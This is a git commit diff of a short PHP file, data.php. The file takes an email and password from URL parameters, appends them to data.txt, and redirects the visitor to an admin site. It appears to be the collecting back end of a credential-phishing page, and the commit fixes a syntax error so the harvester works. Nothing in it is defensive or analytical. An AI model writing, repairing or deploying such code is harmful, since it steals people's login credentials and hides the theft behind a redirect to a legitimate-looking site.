9ff8f1eb8c8ddd3cce6911df651bfed6c6b9ed7f
rookchess <48004219+rookchess@users.noreply.github.com>
2019-04-26 17:13:21 +0530

    Update data.php

--- data.php
+++ data.php
@@ -1,13 +1,9 @@
 <?php
-              
-if(isset($_GET['email']))
-{
 $data=$_GET['email'];
-$data2=$_GET['password']
+$data2=$_GET['password'];
 $fp = fopen('data.txt', 'a');
 fwrite($fp, $data);
 fwrite($fp, $data2);
 fclose($fp);
-}
 header("Location: https://admin.vizionary.com");
 ?>
